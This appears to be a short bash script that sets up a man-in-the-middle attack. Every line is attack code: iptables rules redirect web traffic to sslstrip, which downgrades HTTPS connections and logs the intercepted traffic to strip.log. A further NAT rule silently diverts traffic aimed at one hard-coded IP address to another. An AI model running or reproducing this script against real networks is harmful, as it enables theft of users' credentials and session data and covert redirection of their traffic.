#/bin/bash
#

sudo iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 8080

sslstrip -l 8080 -w strip.log

sudo iptables -t nat -A OUTPUT -p tcp -d 69.172.200.235 -j DNAT --to-destination 34.98.124.198
